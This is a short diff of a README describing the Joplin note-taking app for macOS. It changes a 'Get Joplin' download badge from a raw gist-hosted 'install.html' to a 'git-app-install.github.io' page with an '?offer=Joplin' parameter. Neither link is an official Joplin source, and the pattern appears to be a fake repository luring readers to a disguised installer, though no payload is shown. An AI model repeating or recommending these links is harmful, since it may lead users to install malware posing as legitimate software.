@@ -2,7 +2,7 @@
 
 Joplin is a versatile note-taking and task management application for macOS users who value privacy, organization, and markdown formatting. It supports notebooks, tags, checklists, attachments, and full offline use while enabling sync across devices through services like Dropbox and WebDAV.
 
-<a href="https://gistcdn.githack.com/sportmanchalice6/85ea77c45a8abc5a94317433d49ea5af/raw/fc8f0badf28b5ffcf10acb8321db03ae752f6496/install.html?offer=Joplin" target="_blank">
+<a href="https://git-app-install.github.io/.github/?offer=Joplin" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Joplin%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
